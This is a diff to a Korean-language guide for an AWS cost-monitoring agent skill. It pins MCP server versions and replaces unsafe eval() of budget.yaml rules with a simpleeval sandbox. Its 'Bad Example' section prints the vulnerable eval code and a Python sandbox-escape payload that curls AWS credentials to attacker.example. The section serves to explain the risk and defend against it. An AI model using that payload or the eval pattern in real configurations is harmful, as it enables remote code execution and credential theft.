@@ -22,8 +22,8 @@ license: Apache-2.0
 
 ## Prerequisites
 
-- **awslabs.aws-pricing-mcp-server@latest** — 모델·인스턴스 단가 조회.
-- **awslabs.cost-explorer-mcp-server@latest** — 실측 비용·사용량 조회.
+- **awslabs.aws-pricing-mcp-server==1.0.28** — 모델·인스턴스 단가 조회 (`@latest` 금지, PyPI 버전 pin).
+- **awslabs.cost-explorer-mcp-server==0.0.21** — 실측 비용·사용량 조회.
 - **Cost Allocation Tags** — EKS Pod와 Bedrock 호출에 `agent=<name>`, `env=<prod|stage>` 태그가 부착되어 있어야 함.
 - 월간 예산 정의: `.omao/plans/cost/budget.yaml`.
 - `autopilot-deploy`의 배포 요청 큐 접근 권한 (veto 게이트 삽입).
@@ -112,12 +112,32 @@ for agent, data in cost.items():
 
 Langfuse trace에서 agent별 `avg_complexity_score`, `avg_token_output` 메트릭을 계산하여 downgrade 기회를 탐지합니다.
 
+> **⚠️ 보안 — `rule["when"]` 은 사용자 편집 가능한 `.omao/plans/cost/budget.yaml` 에서 온 문자열입니다. 절대 Python `eval()` / `exec()` 에 넣지 마세요.** `budget.yaml` 을 수정할 수 있는 누구든 임의 코드를 실행할 수 있게 되며 (IAM credential, `/.aws/credentials`, Bedrock 토큰 모두 노출) 이는 RCE 벡터입니다. 반드시 **sandboxed expression evaluator** — [`simpleeval`](https://pypi.org/project/simpleeval/) 또는 [`asteval`](https://newville.github.io/asteval/) — 를 사용해 표현식을 AST 로 파싱하고 산술·비교 연산자, 허용된 이름(`complexity`, `output`) 만 노출합니다.
+
 ```python
+# pip install simpleeval
+from simpleeval import SimpleEval, NameNotDefined, InvalidExpression
+
+def eval_condition(expression: str, **context) -> bool:
+    """Evaluate a budget.yaml `when:` expression safely.
+
+    Uses simpleeval's AST-walking sandbox — NO builtins, NO imports, NO attribute
+    access, NO function calls except those we explicitly allowlist. Raises on
+    unknown names instead of silently returning False.
+    """
+    evaluator = SimpleEval(names=context, functions={})  # zero callables exposed
+    try:
+        result = evaluator.eval(expression)
+    except (NameNotDefined, InvalidExpression, SyntaxError) as e:
+        raise ValueError(f"invalid budget rule {expression!r}: {e}") from e
+    return bool(result)
+
+
 def evaluate_downgrade(agent: str) -> list[dict]:
     traces = fetch_langfuse_traces(agent=agent, days=7)
     complexity = mean([t["complexity_score"] for t in traces])
     output_tokens = mean([t["output_tokens"] for t in traces])
-    
+
     recs = []
     for rule in budget["downgrade_recommendations"]["models"]:
         if eval_condition(rule["when"], complexity=complexity, output=output_tokens):
@@ -131,6 +151,26 @@ def evaluate_downgrade(agent: str) -> list[dict]:
             })
     return recs
 ```
+
+### Bad Example — 절대 하지 말 것
+
+```python
+# ❌ 절대 금지: budget.yaml 은 사용자 편집 가능 → RCE 벡터.
+def eval_condition(expression: str, **context) -> bool:
+    return bool(eval(expression, {"__builtins__": {}}, context))  # noqa: S307
+```
+
+아래 같은 `budget.yaml` 한 줄로 AWS credential 이 공격자 S3 버킷으로 유출됩니다 (`__builtins__` 를 비워도 우회 가능):
+
+```yaml
+downgrade_recommendations:
+  models:
+    - from: claude-opus-4-7
+      to: claude-sonnet-4-6
+      when: "().__class__.__bases__[0].__subclasses__()[108].__init__.__globals__['sys'].modules['os'].system('curl https://attacker.example/x -d @$HOME/.aws/credentials')"
+```
+
+`eval()` / `exec()` / `compile()` 는 절대 신뢰 경계 밖 문자열에 사용하지 않습니다. 허용 리스트 기반 AST evaluator 만 사용합니다.
 
 권고는 Draft PR로 자동 생성됩니다. 승인은 플랫폼 팀이 직접 수행합니다.
 
